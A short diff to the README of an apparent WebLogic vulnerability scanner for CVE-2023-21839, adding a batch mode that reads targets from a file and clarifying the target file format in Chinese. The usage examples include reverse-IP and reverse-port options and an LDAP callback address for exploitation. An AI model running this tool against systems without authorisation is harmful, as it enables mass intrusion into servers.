@@ -58,6 +58,8 @@ cve-2023-21839
   reverse ip
 -rp rport
   reverse port
+-f targets.txt
+Read the target from the file and test the vulnerabilities in batches
 ```
 
 + POC一键检测
@@ -67,7 +69,7 @@ WeblogicScanner.exe -u 127.0.0.1 -p 7001 -l ldap://127.0.0.1/#eval
 
 + 批量检测
 
-TXT文件中，一个目标（127.0.0.1:7001,目标记得带端口）放一行。
+TXT文件中，一个目标（127.0.0.1:7001，如果没有自带端口则添加默认端口7001）放一行。
 
 ```go
 WeblogicScanner.exe -f "C:\Users\Test\Desktop\target.txt" -l ldap://127.0.0.1/#eval
